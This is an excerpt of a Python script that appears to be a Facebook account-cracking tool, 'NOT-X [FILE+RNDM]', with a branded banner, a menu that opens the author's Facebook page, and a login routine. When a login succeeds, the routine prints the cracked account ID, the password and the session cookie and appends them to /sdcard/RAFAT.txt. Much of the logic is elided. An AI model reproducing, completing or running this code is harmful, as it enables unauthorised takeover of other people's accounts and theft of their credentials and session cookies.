...
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 [✵]FACEBOOK    : RJ RAFI
 [✵]TOOL NAME   : 𝙽𝙾𝚃-𝚇 [𝙵𝙸𝙻𝙴+𝚁𝙽𝙳𝙼]
 [✵]TOOL OWNER  : 𝚁𝙰𝙵𝙰𝚃 𝚁𝚇 
 [✵]GITHUB      : https://github.com/TEAM Monster
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
...
def Main():
	...
	print(54*'━')
	opt = input('PUT OPTION => ')
	if opt in ["A","1"]:
		fuck()
	if opt in ["B","2"]:
		os.system('xdg-open https://www.facebook.com/rafihasan.909');time.sleep(1)
	if opt in ["C","3"]:
		os.system('xdg-open https://www.facebook.com/rafihasan.909');time.sleep(1)
		fb()
	if opt in ["0","0"]:
...
def b(uid,pwx,tl):
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m [RAFAT] '+cid+' | '+ps+'\33[0;92m')
                print(f'\r\033[1;92mCOOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/RAFAT.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
